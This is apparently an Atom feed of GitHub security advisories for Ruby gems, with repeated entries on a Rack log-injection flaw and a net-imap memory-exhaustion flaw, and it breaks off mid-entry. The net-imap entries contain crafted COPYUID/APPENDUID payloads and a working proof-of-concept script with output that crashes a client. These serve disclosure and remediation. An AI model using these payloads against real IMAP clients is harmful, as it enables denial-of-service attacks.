<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/rubygems.rss</id>
    <title>Security Advisory for Ruby gems hosted at RubyGems.org</title>
    <updated>2025-02-14T02:22:39.810Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Arubygems"/>
    <subtitle>Security Advisory for Ruby gems hosted at RubyGems.org on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[rack] Possible Log Injection in Rack::CommonLogger]]></title>
        <id>https://github.com/advisories/GHSA-7g2v-jj9q-g3rg</id>
        <link href="https://github.com/advisories/GHSA-7g2v-jj9q-g3rg"/>
        <updated>2025-02-13T22:08:26.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p><code>Rack::CommonLogger</code> can be exploited by crafting input that includes newline characters to manipulate log entries. The supplied proof-of-concept demonstrates injecting malicious content into logs.</p>
<h2 id="details">Details</h2>
<p>When a user provides the authorization credentials via <code>Rack::Auth::Basic</code>, if success, the username will be put in <code>env['REMOTE_USER']</code> and later be used by <code>Rack::CommonLogger</code> for logging purposes.</p>
<p>The issue occurs when a server intentionally or unintentionally allows a user creation with the username contain CRLF and white space characters, or the server just want to log every login attempts. If an attacker enters a username with CRLF character, the logger will log the malicious username with CRLF characters into the logfile.</p>
<h2 id="impact">Impact</h2>
<p>Attackers can break log formats or insert fraudulent entries, potentially obscuring real activity or injecting malicious data into log files.</p>
<h2 id="mitigation">Mitigation</h2>
<ul>
<li>Update to the latest version of Rack.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/rack/rack/security/advisories/GHSA-7g2v-jj9q-g3rg">https://github.com/rack/rack/security/advisories/GHSA-7g2v-jj9q-g3rg</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-25184">https://nvd.nist.gov/vuln/detail/CVE-2025-25184</a></li>
<li><a href="https://github.com/rack/rack/commit/074ae244430cda05c27ca91cda699709cfb3ad8e">https://github.com/rack/rack/commit/074ae244430cda05c27ca91cda699709cfb3ad8e</a></li>
<li><a href="https://github.com/rubysec/ruby-advisory-db/blob/master/gems/rack/CVE-2025-25184.yml">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/rack/CVE-2025-25184.yml</a></li>
<li><a href="https://github.com/advisories/GHSA-7g2v-jj9q-g3rg">https://github.com/advisories/GHSA-7g2v-jj9q-g3rg</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7g2v-jj9q-g3rg</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-02-12T19:18:35.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[rack] Possible Log Injection in Rack::CommonLogger]]></title>
        <id>https://github.com/advisories/GHSA-7g2v-jj9q-g3rg</id>
        <link href="https://github.com/advisories/GHSA-7g2v-jj9q-g3rg"/>
        <updated>2025-02-13T22:08:26.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p><code>Rack::CommonLogger</code> can be exploited by crafting input that includes newline characters to manipulate log entries. The supplied proof-of-concept demonstrates injecting malicious content into logs.</p>
<h2 id="details">Details</h2>
<p>When a user provides the authorization credentials via <code>Rack::Auth::Basic</code>, if success, the username will be put in <code>env['REMOTE_USER']</code> and later be used by <code>Rack::CommonLogger</code> for logging purposes.</p>
<p>The issue occurs when a server intentionally or unintentionally allows a user creation with the username contain CRLF and white space characters, or the server just want to log every login attempts. If an attacker enters a username with CRLF character, the logger will log the malicious username with CRLF characters into the logfile.</p>
<h2 id="impact">Impact</h2>
<p>Attackers can break log formats or insert fraudulent entries, potentially obscuring real activity or injecting malicious data into log files.</p>
<h2 id="mitigation">Mitigation</h2>
<ul>
<li>Update to the latest version of Rack.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/rack/rack/security/advisories/GHSA-7g2v-jj9q-g3rg">https://github.com/rack/rack/security/advisories/GHSA-7g2v-jj9q-g3rg</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-25184">https://nvd.nist.gov/vuln/detail/CVE-2025-25184</a></li>
<li><a href="https://github.com/rack/rack/commit/074ae244430cda05c27ca91cda699709cfb3ad8e">https://github.com/rack/rack/commit/074ae244430cda05c27ca91cda699709cfb3ad8e</a></li>
<li><a href="https://github.com/rubysec/ruby-advisory-db/blob/master/gems/rack/CVE-2025-25184.yml">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/rack/CVE-2025-25184.yml</a></li>
<li><a href="https://github.com/advisories/GHSA-7g2v-jj9q-g3rg">https://github.com/advisories/GHSA-7g2v-jj9q-g3rg</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7g2v-jj9q-g3rg</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-02-12T19:18:35.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[rack] Possible Log Injection in Rack::CommonLogger]]></title>
        <id>https://github.com/advisories/GHSA-7g2v-jj9q-g3rg</id>
        <link href="https://github.com/advisories/GHSA-7g2v-jj9q-g3rg"/>
        <updated>2025-02-13T22:08:26.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p><code>Rack::CommonLogger</code> can be exploited by crafting input that includes newline characters to manipulate log entries. The supplied proof-of-concept demonstrates injecting malicious content into logs.</p>
<h2 id="details">Details</h2>
<p>When a user provides the authorization credentials via <code>Rack::Auth::Basic</code>, if success, the username will be put in <code>env['REMOTE_USER']</code> and later be used by <code>Rack::CommonLogger</code> for logging purposes.</p>
<p>The issue occurs when a server intentionally or unintentionally allows a user creation with the username contain CRLF and white space characters, or the server just want to log every login attempts. If an attacker enters a username with CRLF character, the logger will log the malicious username with CRLF characters into the logfile.</p>
<h2 id="impact">Impact</h2>
<p>Attackers can break log formats or insert fraudulent entries, potentially obscuring real activity or injecting malicious data into log files.</p>
<h2 id="mitigation">Mitigation</h2>
<ul>
<li>Update to the latest version of Rack.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/rack/rack/security/advisories/GHSA-7g2v-jj9q-g3rg">https://github.com/rack/rack/security/advisories/GHSA-7g2v-jj9q-g3rg</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-25184">https://nvd.nist.gov/vuln/detail/CVE-2025-25184</a></li>
<li><a href="https://github.com/rack/rack/commit/074ae244430cda05c27ca91cda699709cfb3ad8e">https://github.com/rack/rack/commit/074ae244430cda05c27ca91cda699709cfb3ad8e</a></li>
<li><a href="https://github.com/rubysec/ruby-advisory-db/blob/master/gems/rack/CVE-2025-25184.yml">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/rack/CVE-2025-25184.yml</a></li>
<li><a href="https://github.com/advisories/GHSA-7g2v-jj9q-g3rg">https://github.com/advisories/GHSA-7g2v-jj9q-g3rg</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7g2v-jj9q-g3rg</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-02-12T19:18:35.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[net-imap] Possible DoS by memory exhaustion in net-imap]]></title>
        <id>https://github.com/advisories/GHSA-7fc5-f82f-cx69</id>
        <link href="https://github.com/advisories/GHSA-7fc5-f82f-cx69"/>
        <updated>2025-02-11T21:39:41.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>There is a possibility for denial of service by memory exhaustion in <code>net-imap</code>'s response parser.  At any time while the client is connected, a malicious server can send  can send highly compressed <code>uid-set</code> data which is automatically read by the client's receiver thread.  The response parser uses <code>Range#to_a</code> to convert the <code>uid-set</code> data into arrays of integers, with no limitation on the expanded size of the ranges.</p>
<h3 id="details">Details</h3>
<p>IMAP's <code>uid-set</code> and <code>sequence-set</code> formats can compress ranges of numbers, for example: <code>"1,2,3,4,5"</code> and <code>"1:5"</code> both represent the same set.  When <code>Net::IMAP::ResponseParser</code> receives <code>APPENDUID</code> or <code>COPYUID</code> response codes, it expands each <code>uid-set</code> into an array of integers.  On a 64 bit system, these arrays will expand to 8 bytes for each number in the set.  A malicious IMAP server may send specially crafted <code>APPENDUID</code> or <code>COPYUID</code> responses with very large <code>uid-set</code> ranges.</p>
<p>The <code>Net::IMAP</code> client parses each server response in a separate thread, as soon as each responses is received from the server.  This attack works even when the client does not handle the <code>APPENDUID</code> or <code>COPYUID</code> responses.</p>
<p>Malicious inputs:</p>
<pre><code class="language-ruby"># 40 bytes expands to ~1.6GB:
"* OK [COPYUID 1 1:99999999 1:99999999]\r\n"

# Worst *valid* input scenario (using uint32 max),
# 44 bytes expands to 64GiB:
"* OK [COPYUID 1 1:4294967295 1:4294967295]\r\n"

# Numbers must be non-zero uint32, but this isn't validated.  Arrays larger than
# UINT32_MAX can be created.  For example, the following would theoretically
# expand to almost 800 exabytes:
"* OK [COPYUID 1 1:99999999999999999999 1:99999999999999999999]\r\n"
</code></pre>
<p>Simple way to test this:</p>
<pre><code class="language-ruby">require "net/imap"

def test(size)
  input = "A004 OK [COPYUID 1 1:#{size} 1:#{size}] too large?\r\n"
  parser = Net::IMAP::ResponseParser.new
  parser.parse input
end

test(99_999_999)
</code></pre>
<h3 id="fixes">Fixes</h3>
<h4 id="preferred-fix-minor-api-changes">Preferred Fix, minor API changes</h4>
<p>Upgrade to v0.4.19, v0.5.6, or higher, and configure:</p>
<pre><code class="language-ruby"># globally
Net::IMAP.config.parser_use_deprecated_uidplus_data = false
# per-client
imap = Net::IMAP.new(hostname, ssl: true,
                               parser_use_deprecated_uidplus_data: false)
imap.config.parser_use_deprecated_uidplus_data = false
</code></pre>
<p>This replaces <code>UIDPlusData</code> with <code>AppendUIDData</code> and <code>CopyUIDData</code>.  These classes store their UIDs as <code>Net::IMAP::SequenceSet</code> objects (<em>not</em> expanded into arrays of integers).  Code that does not handle <code>APPENDUID</code> or <code>COPYUID</code> responses will not notice any difference.  Code that does handle these responses <em>may</em> need to be updated.  See the documentation for <a href="https://ruby.github.io/net-imap/Net/IMAP/UIDPlusData.html">UIDPlusData</a>, <a href="https://ruby.github.io/net-imap/Net/IMAP/AppendUIDData.html">AppendUIDData</a> and <a href="https://ruby.github.io/net-imap/Net/IMAP/CopyUIDData.html">CopyUIDData</a>.</p>
<p>For v0.3.8, this option is not available.
For v0.4.19, the default value is <code>true</code>.
For v0.5.6, the default value is <code>:up_to_max_size</code>.
For v0.6.0, the only allowed value will be <code>false</code>  <em>(<code>UIDPlusData</code> will be removed from v0.6)</em>.</p>
<h4 id="mitigation-backward-compatible-api">Mitigation, backward compatible API</h4>
<p>Upgrade to v0.3.8, v0.4.19, v0.5.6, or higher.</p>
<p>For backward compatibility, <code>uid-set</code> can still be expanded into an array, but a maximum limit will be applied.</p>
<p>Assign <code>config.parser_max_deprecated_uidplus_data_size</code> to set the maximum <code>UIDPlusData</code> UID set size.
When <code>config.parser_use_deprecated_uidplus_data == true</code>, larger sets will raise <code>Net::IMAP::ResponseParseError</code>.
When  <code>config.parser_use_deprecated_uidplus_data == :up_to_max_size</code>, larger sets will use <code>AppendUIDData</code> or <code>CopyUIDData</code>.</p>
<p>For v0.3,8, this limit is <em>hard-coded</em> to 10,000, and larger sets will always raise <code>Net::IMAP::ResponseParseError</code>.
For v0.4.19, the limit defaults to 1000.
For v0.5.6, the limit defaults to 100.
For v0.6.0, the limit will be ignored  <em>(<code>UIDPlusData</code> will be removed from v0.6)</em>.</p>
<h4 id="please-note-unhandled-responses">Please Note: unhandled responses</h4>
<p>If the client does not add response handlers to prune unhandled responses, a malicious server can still eventually exhaust all client memory, by repeatedly sending malicious responses.  However, <code>net-imap</code> has always retained unhandled responses, and it has always been necessary for long-lived connections to prune these responses.  <em>This is not significantly different from connecting to a trusted server with a long-lived connection.</em>  To limit the maximum number of retained responses, a simple handler might look something like the following:</p>
<pre><code class="language-ruby">limit = 1000
imap.add_response_handler do |resp|
  next unless resp.respond_to?(:name) &amp;&amp; resp.respond_to?(:data)
  name = resp.name
  code = resp.data.code&amp;.name if resp.data.respond_to?(:code)
  if Net::IMAP::VERSION &gt; "0.4.0"
    imap.responses(name) { _1.slice!(0...-limit) }
    imap.responses(code) { _1.slice!(0...-limit) }
  else
    imap.responses(name).slice!(0...-limit)
    imap.responses(code).slice!(0...-limit)
  end
end
</code></pre>
<h3 id="proof-of-concept">Proof of concept</h3>
<p>Save the following to a ruby file (e.g: <code>poc.rb</code>) and make it executable:</p>
<pre><code class="language-ruby">#!/usr/bin/env ruby
require 'socket'
require 'net/imap'

if !defined?(Net::IMAP.config)
  puts "Net::IMAP.config is not available"
elsif !Net::IMAP.config.respond_to?(:parser_use_deprecated_uidplus_data)
  puts "Net::IMAP.config.parser_use_deprecated_uidplus_data is not available"
else
  Net::IMAP.config.parser_use_deprecated_uidplus_data = :up_to_max_size
  puts "Updated parser_use_deprecated_uidplus_data to :up_to_max_size"
end

size = Integer(ENV["UID_SET_SIZE"] || 2**32-1)

def server_addr
  Addrinfo.tcp("localhost", 0).ip_address
end

def create_tcp_server
  TCPServer.new(server_addr, 0)
end

def start_server
  th = Thread.new do
    yield
  end
  sleep 0.1 until th.stop?
end

def copyuid_response(tag: "*", size: 2**32-1, text: "too large?")
  "#{tag} OK [COPYUID 1 1:#{size} 1:#{size}] #{text}\r\n"
end

def appenduid_response(tag: "*", size: 2**32-1, text: "too large?")
  "#{tag} OK [APPENDUID 1 1:#{size}] #{text}\r\n"
end

server = create_tcp_server
port = server.addr[1]
puts "Server started on port #{port}"

# server
start_server do
  sock = server.accept
  begin
    sock.print "* OK test server\r\n"
    cmd = sock.gets("\r\n", chomp: true)
    tag = cmd.match(/\A(\w+) /)[1]
    puts "Received: #{cmd}"

    malicious_response = appenduid_response(size:)
    puts "Sending: #{malicious_response.chomp}"
    sock.print malicious_response

    malicious_response = copyuid_response(size:)
    puts "Sending: #{malicious_response.chomp}"
    sock.print malicious_response
    sock.print "* CAPABILITY JUMBO=UIDPLUS PROOF_OF_CONCEPT\r\n"
    sock.print "#{tag} OK CAPABILITY completed\r\n"

    cmd = sock.gets("\r\n", chomp: true)
    tag = cmd.match(/\A(\w+) /)[1]
    puts "Received: #{cmd}"
    sock.print "* BYE If you made it this far, you passed the test!\r\n"
    sock.print "#{tag} OK LOGOUT completed\r\n"
  rescue Exception =&gt; ex
    puts "Error in server: #{ex.message} (#{ex.class})"
  ensure
    sock.close
    server.close
  end
end

# client
begin
  puts "Client connecting,.."
  imap = Net::IMAP.new(server_addr, port: port)
  puts "Received capabilities: #{imap.capability}"
  pp responses: imap.responses
  imap.logout
rescue Exception =&gt; ex
  puts "Error in client: #{ex.message} (#{ex.class})"
  puts ex.full_message
ensure
  imap.disconnect if imap
end
</code></pre>
<p>Use <code>ulimit</code> to limit the process's virtual memory.  The following example limits virtual memory to 1GB:</p>
<pre><code class="language-console">$ ( ulimit -v 1000000 &amp;&amp; exec ./poc.rb )
Server started on port 34291
Client connecting,..
Received: RUBY0001 CAPABILITY
Sending: * OK [APPENDUID 1 1:4294967295] too large?
Sending: * OK [COPYUID 1 1:4294967295 1:4294967295] too large?
Error in server: Connection reset by peer @ io_fillbuf - fd:9  (Errno::ECONNRESET)
Error in client: failed to allocate memory (NoMemoryError)
/gems/net-imap-0.5.5/lib/net/imap.rb:3271:in 'Net::IMAP#get_tagged_response': failed to allocate memory (NoMemoryError)
        from /gems/net-imap-0.5.5/lib/net/imap.rb:3371:in 'block in Net::IMAP#send_command'
        from /rubylibdir/monitor.rb:201:in 'Monitor#synchronize'
        from /rubylibdir/monitor.rb:201:in 'MonitorMixin#mon_synchronize'
        from /gems/net-imap-0.5.5/lib/net/imap.rb:3353:in 'Net::IMAP#send_command'
        from /gems/net-imap-0.5.5/lib/net/imap.rb:1128:in 'block in Net::IMAP#capability'
        from /rubylibdir/monitor.rb:201:in 'Monitor#synchronize'
        from /rubylibdir/monitor.rb:201:in 'MonitorMixin#mon_synchronize'
        from /gems/net-imap-0.5.5/lib/net/imap.rb:1127:in 'Net::IMAP#capability'
        from /workspace/poc.rb:70:in '&lt;main&gt;'
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/ruby/net-imap/security/advisories/GHSA-7fc5-f82f-cx69">https://github.com/ruby/net-imap/security/advisories/GHSA-7fc5-f82f-cx69</a></li>
<li><a href="https://github.com/ruby/net-imap/commit/70e3ddd071a94e450b3238570af482c296380b35">https://github.com/ruby/net-imap/commit/70e3ddd071a94e450b3238570af482c296380b35</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-25186">https://nvd.nist.gov/vuln/detail/CVE-2025-25186</a></li>
<li><a href="https://github.com/ruby/net-imap/commit/c8c5a643739d2669f0c9a6bb9770d0c045fd74a3">https://github.com/ruby/net-imap/commit/c8c5a643739d2669f0c9a6bb9770d0c045fd74a3</a></li>
<li><a href="https://github.com/ruby/net-imap/commit/cb92191b1ddce2d978d01b56a0883b6ecf0b1022">https://github.com/ruby/net-imap/commit/cb92191b1ddce2d978d01b56a0883b6ecf0b1022</a></li>
<li><a href="https://ruby.github.io/net-imap/Net/IMAP/AppendUIDData.html">https://ruby.github.io/net-imap/Net/IMAP/AppendUIDData.html</a></li>
<li><a href="https://ruby.github.io/net-imap/Net/IMAP/CopyUIDData.html">https://ruby.github.io/net-imap/Net/IMAP/CopyUIDData.html</a></li>
<li><a href="https://ruby.github.io/net-imap/Net/IMAP/UIDPlusData.html">https://ruby.github.io/net-imap/Net/IMAP/UIDPlusData.html</a></li>
<li><a href="https://github.com/rubysec/ruby-advisory-db/blob/master/gems/net-imap/CVE-2025-25186.yml">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/net-imap/CVE-2025-25186.yml</a></li>
<li><a href="https://github.com/advisories/GHSA-7fc5-f82f-cx69">https://github.com/advisories/GHSA-7fc5-f82f-cx69</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7fc5-f82f-cx69</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-02-10T17:42:43.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[net-imap] Possible DoS by memory exhaustion in net-imap]]></title>
        <id>https://github.com/advisories/GHSA-7fc5-f82f-cx69</id>
        <link href="https://github.com/advisories/GHSA-7fc5-f82f-cx69"/>
        <updated>2025-02-11T21:39:41.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>There is a possibility for denial of service by memory exhaustion in <code>net-imap</code>'s response parser.  At any time while the client is connected, a malicious server can send  can send highly compressed <code>uid-set</code> data which is automatically read by the client's receiver thread.  The response parser uses <code>Range#to_a</code> to convert the <code>uid-set</code> data into arrays of integers, with no limitation on the expanded size of the ranges.</p>
<h3 id="details">Details</h3>
<p>IMAP's <code>uid-set</code> and <code>sequence-set</code> formats can compress ranges of numbers, for example: <code>"1,2,3,4,5"</code> and <code>"1:5"</code> both represent the same set.  When <code>Net::IMAP::ResponseParser</code> receives <code>APPENDUID</code> or <code>COPYUID</code> response codes, it expands each <code>uid-set</code> into an array of integers.  On a 64 bit system, these arrays will expand to 8 bytes for each number in the set.  A malicious IMAP server may send specially crafted <code>APPENDUID</code> or <code>COPYUID</code> responses with very large <code>uid-set</code> ranges.</p>
<p>The <code>Net::IMAP</code> client parses each server response in a separate thread, as soon as each responses is received from the server.  This attack works even when the client does not handle the <code>APPENDUID</code> or <code>COPYUID</code> responses.</p>
<p>Malicious inputs:</p>
<pre><code class="language-ruby"># 40 bytes expands to ~1.6GB:
"* OK [COPYUID 1 1:99999999 1:99999999]\r\n"

# Worst *valid* input scenario (using uint32 max),
# 44 bytes expands to 64GiB:
"* OK [COPYUID 1 1:4294967295 1:4294967295]\r\n"

# Numbers must be non-zero uint32, but this isn't validated.  Arrays larger than
# UINT32_MAX can be created.  For example, the following would theoretically
# expand to almost 800 exabytes:
"* OK [COPYUID 1 1:99999999999999999999 1:99999999999999999999]\r\n"
</code></pre>
<p>Simple way to test this:</p>
<pre><code class="language-ruby">require "net/imap"

def test(size)
  input = "A004 OK [COPYUID 1 1:#{size} 1:#{size}] too large?\r\n"
  parser = Net::IMAP::ResponseParser.new
  parser.parse input
end

test(99_999_999)
</code></pre>
<h3 id="fixes">Fixes</h3>
<h4 id="preferred-fix-minor-api-changes">Preferred Fix, minor API changes</h4>
<p>Upgrade to v0.4.19, v0.5.6, or higher, and configure:</p>
<pre><code class="language-ruby"># globally
Net::IMAP.config.parser_use_deprecated_uidplus_data = false
# per-client
imap = Net::IMAP.new(hostname, ssl: true,
                               parser_use_deprecated_uidplus_data: false)
imap.config.parser_use_deprecated_uidplus_data = false
</code></pre>
<p>This replaces <code>UIDPlusData</code> with <code>AppendUIDData</code> and <code>CopyUIDData</code>.  These classes store their UIDs as <code>Net::IMAP::SequenceSet</code> objects (<em>not</em> expanded into arrays of integers).  Code that does not handle <code>APPENDUID</code> or <code>COPYUID</code> responses will not notice any difference.  Code that does handle these responses <em>may</em> need to be updated.  See the documentation for <a href="https://ruby.github.io/net-imap/Net/IMAP/UIDPlusData.html">UIDPlusData</a>, <a href="https://ruby.github.io/net-imap/Net/IMAP/AppendUIDData.html">AppendUIDData</a> and <a href="https://ruby.github.io/net-imap/Net/IMAP/CopyUIDData.html">CopyUIDData</a>.</p>
<p>For v0.3.8, this option is not available.
For v0.4.19, the default value is <code>true</code>.
For v0.5.6, the default value is <code>:up_to_max_size</code>.
For v0.6.0, the only allowed value will be <code>false</code>  <em>(<code>UIDPlusData</code> will be removed from v0.6)</em>.</p>
<h4 id="mitigation-backward-compatible-api">Mitigation, backward compatible API</h4>
<p>Upgrade to v0.3.8, v0.4.19, v0.5.6, or higher.</p>
<p>For backward compatibility, <code>uid-set</code> can still be expanded into an array, but a maximum limit will be applied.</p>
<p>Assign <code>config.parser_max_deprecated_uidplus_data_size</code> to set the maximum <code>UIDPlusData</code> UID set size.
When <code>config.parser_use_deprecated_uidplus_data == true</code>, larger sets will raise <code>Net::IMAP::ResponseParseError</code>.
When  <code>config.parser_use_deprecated_uidplus_data == :up_to_max_size</code>, larger sets will use <code>AppendUIDData</code> or <code>CopyUIDData</code>.</p>
<p>For v0.3,8, this limit is <em>hard-coded</em> to 10,000, and larger sets will always raise <code>Net::IMAP::ResponseParseError</code>.
For v0.4.19, the limit defaults to 1000.
For v0.5.6, the limit defaults to 100.
For v0.6.0, the limit will be ignored  <em>(<code>UIDPlusData</code> will be removed from v0.6)</em>.</p>
<h4 id="please-note-unhandled-responses">Please Note: unhandled responses</h4>
<p>If the client does not add response handlers to prune unhandled responses, a malicious server can still eventually exhaust all client memory, by repeatedly sending malicious responses.  However, <code>net-imap</code> has always retained unhandled responses, and it has always been necessary for long-lived connections to prune these responses.  <em>This is not significantly different from connecting to a trusted server with a long-lived connection.</em>  To limit the maximum number of retained responses, a simple handler might look something like the following:</p>
<pre><code class="language-ruby">limit = 1000
imap.add_response_handler do |resp|
  next unless resp.respond_to?(:name) &amp;&amp; resp.respond_to?(:data)
  name = resp.name
  code = resp.data.code&amp;.name if resp.data.respond_to?(:code)
  if Net::IMAP::VERSION &gt; "0.4.0"
    imap.responses(name) { _1.slice!(0...-limit) }
    imap.responses(code) { _1.slice!(0...-limit) }
  else
    imap.responses(name).slice!(0...-limit)
    imap.responses(code).slice!(0...-limit)
  end
end
</code></pre>
<h3 id="proof-of-concept">Proof of concept</h3>
<p>Save the following to a ruby file (e.g: <code>poc.rb</code>) and make it executable:</p>
<pre><code class="language-ruby">#!/usr/bin/env ruby
require 'socket'
require 'net/imap'

if !defined?(Net::IMAP.config)
  puts "Net::IMAP.config is not available"
elsif !Net::IMAP.config.respond_to?(:parser_use_deprecated_uidplus_data)
  puts "Net::IMAP.config.parser_use_deprecated_uidplus_data is not available"
else
  Net::IMAP.config.parser_use_deprecated_uidplus_data = :up_to_max_size
  puts "Updated parser_use_deprecated_uidplus_data to :up_to_max_size"
end

size = Integer(ENV["UID_SET_SIZE"] || 2**32-1)

def server_addr
  Addrinfo.tcp("localhost", 0).ip_address
end

def create_tcp_server
  TCPServer.new(server_addr, 0)
end

def start_server
  th = Thread.new do
    yield
  end
  sleep 0.1 until th.stop?
end

def copyuid_response(tag: "*", size: 2**32-1, text: "too large?")
  "#{tag} OK [COPYUID 1 1:#{size} 1:#{size}] #{text}\r\n"
end

def appenduid_response(tag: "*", size: 2**32-1, text: "too large?")
  "#{tag} OK [APPENDUID 1 1:#{size}] #{text}\r\n"
end

server = create_tcp_server
port = server.addr[1]
puts "Server started on port #{port}"

# server
start_server do
  sock = server.accept
  begin
    sock.print "* OK test server\r\n"
    cmd = sock.gets("\r\n", chomp: true)
    tag = cmd.match(/\A(\w+) /)[1]
    puts "Received: #{cmd}"

    malicious_response = appenduid_response(size:)
    puts "Sending: #{malicious_response.chomp}"
    sock.print malicious_response

    malicious_response = copyuid_response(size:)
    puts "Sending: #{malicious_response.chomp}"
    sock.print malicious_response
    sock.print "* CAPABILITY JUMBO=UIDPLUS PROOF_OF_CONCEPT\r\n"
    sock.print "#{tag} OK CAPABILITY completed\r\n"

    cmd = sock.gets("\r\n", chomp: true)
    tag = cmd.match(/\A(\w+) /)[1]
    puts "Received: #{cmd}"
    sock.print "* BYE If you made it this far, you passed the test!\r\n"
    sock.print "#{tag} OK LOGOUT completed\r\n"
  rescue Exception =&gt; ex
    puts "Error in server: #{ex.message} (#{ex.class})"
  ensure
    sock.close
    server.close
  end
end

# client
begin
  puts "Client connecting,.."
  imap = Net::IMAP.new(server_addr, port: port)
  puts "Received capabilities: #{imap.capability}"
  pp responses: imap.responses
  imap.logout
rescue Exception =&gt; ex
  puts "Error in client: #{ex.message} (#{ex.class})"
  puts ex.full_message
ensure
  imap.disconnect if imap
end
</code></pre>
<p>Use <code>ulimit</code> to limit the process's virtual memory.  The following example limits virtual memory to 1GB:</p>
<pre><code class="language-console">$ ( ulimit -v 1000000 &amp;&amp; exec ./poc.rb )
Server started on port 34291
Client connecting,..
Received: RUBY0001 CAPABILITY
Sending: * OK [APPENDUID 1 1:4294967295] too large?
Sending: * OK [COPYUID 1 1:4294967295 1:4294967295] too large?
Error in server: Connection reset by peer @ io_fillbuf - fd:9  (Errno::ECONNRESET)
Error in client: failed to allocate memory (NoMemoryError)
/gems/net-imap-0.5.5/lib/net/imap.rb:3271:in 'Net::IMAP#get_tagged_response': failed to allocate memory (NoMemoryError)
        from /gems/net-imap-0.5.5/lib/net/imap.rb:3371:in 'block in Net::IMAP#send_command'
        from /rubylibdir/monitor.rb:201:in 'Monitor#synchronize'
        from /rubylibdir/monitor.rb:201:in 'MonitorMixin#mon_synchronize'
        from /gems/net-imap-0.5.5/lib/net/imap.rb:3353:in 'Net::IMAP#send_command'
        from /gems/net-imap-0.5.5/lib/net/imap.rb:1128:in 'block in Net::IMAP#capability'
        from /rubylibdir/monitor.rb:201:in 'Monitor#synchronize'
        from /rubylibdir/monitor.rb:201:in 'MonitorMixin#mon_synchronize'
        from /gems/net-imap-0.5.5/lib/net/imap.rb:1127:in 'Net::IMAP#capability'
        from /workspace/poc.rb:70:in '&lt;main&gt;'
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/ruby/net-imap/security/advisories/GHSA-7fc5-f82f-cx69">https://github.com/ruby/net-imap/security/advisories/GHSA-7fc5-f82f-cx69</a></li>
<li><a href="https://github.com/ruby/net-imap/commit/70e3ddd071a94e450b3238570af482c296380b35">https://github.com/ruby/net-imap/commit/70e3ddd071a94e450b3238570af482c296380b35</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-25186">https://nvd.nist.gov/vuln/detail/CVE-2025-25186</a></li>
<li><a href="https://github.com/ruby/net-imap/commit/c8c5a643739d2669f0c9a6bb9770d0c045fd74a3">https://github.com/ruby/net-imap/commit/c8c5a643739d2669f0c9a6bb9770d0c045fd74a3</a></li>
<li><a href="https://github.com/ruby/net-imap/commit/cb92191b1ddce2d978d01b56a0883b6ecf0b1022">https://github.com/ruby/net-imap/commit/cb92191b1ddce2d978d01b56a0883b6ecf0b1022</a></li>
<li><a href="https://ruby.github.io/net-imap/Net/IMAP/AppendUIDData.html">https://ruby.github.io/net-imap/Net/IMAP/AppendUIDData.html</a></li>
<li><a href="https://ruby.github.io/net-imap/Net/IMAP/CopyUIDData.html">https://ruby.github.io/net-imap/Net/IMAP/CopyUIDData.html</a></li>
<li><a href="https://ruby.github.io/net-imap/Net/IMAP/UIDPlusData.html">https://ruby.github.io/net-imap/Net/IMAP/UIDPlusData.html</a></li>
<li><a href="https://github.com/rubysec/ruby-advisory-db/blob/master/gems/net-imap/CVE-2025-25186.yml">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/net-imap/CVE-2025-25186.yml</a></li>
<li><a href="https://github.com/advisories/GHSA-7fc5-f82f-cx69">https://github.com/advisories/GHSA-7fc5-f82f-cx69</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7fc5-f82f-cx69</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-02-10T17:42:43.000Z</published>
    </entry>
    <entry>
